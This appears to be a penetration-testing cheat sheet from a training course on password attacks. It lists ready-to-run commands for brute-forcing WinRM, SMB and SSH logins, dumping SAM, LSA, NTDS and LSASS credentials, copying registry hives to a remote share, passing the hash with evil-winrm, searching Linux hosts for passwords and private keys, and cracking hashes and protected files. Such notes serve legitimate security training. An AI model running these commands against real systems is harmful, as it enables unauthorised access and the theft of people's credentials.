### Password Mutations

```bash
# Generate a wordlist from a website
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Generate rule-based word list using Hashcat
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Generate potential usernames using username-anarchy\./username-anarchy -i /path/to/listoffirstandlastnames.txt

# Download a list of file extensions for password searching
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

### Remote Password Attacks

```bash
# Brute-force WinRM service
crackmapexec winrm <ip> -u user.list -p password.list

# Enumerate SMB shares using specified credentials
crackmapexec smb <ip> -u "user" -p "password" --shares

# Attempt password cracking over specified service with Hydra
hydra -L user.list -P password.list <service>://<ip>
hydra -l username -P password.list <service>://<ip>
hydra -L user.list -p password <service>://<ip>
hydra -C <user_pass.list> ssh://<IP>

# Dump password hashes using CrackMapExec
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa
crackmapexec smb <ip> -u <username> -p <password> --ntds

# Establish a PowerShell session using Evil-WinRM
evil-winrm -i <ip> -u Administrator -H "<passwordhash>"
```

### Windows Local Password Attacks

```powershell
# List running processes
tasklist /svc

# Search files for "password"
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Dump LSASS process
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Extract credentials from LSASS dump
pypykatz lsa minidump /path/to/lsassdumpfile

# Save and move registry hives
reg.exe save hklm\sam C:\sam.save
move sam.save \\<ip>\NameofFileShare

# Dump password hashes using secretsdump.py
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Create volume shadow copy and copy NTDS.dit
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

### Linux Local Password Attacks

```bash
# Find configuration files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done

# Search for credentials in files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done

# Find common database files
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done

# Search for text files
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Search for private keys
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Extract last 5 lines from bash history
tail -n5 /home/*/.bash*
```

### Cracking Passwords

```bash
# Crack NTLM hashes with Hashcat
hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt

# Crack single NTLM hash and show results
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

# Combine passwd and shadow files for cracking
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Crack unshadowed hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Extract SSH key hashes and crack them
python3 ssh2john.py SSH.private > ssh.hash
john ssh.hash --show

# Extract and crack Office file hashes
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash

# Crack PDF and ZIP file hashes
pdf2john.pl PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

# Extract and crack BitLocker hashes
bitlocker2john -i Backup.vhd > backup.hashes

# Decrypt encrypted files with OpenSSL
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
```

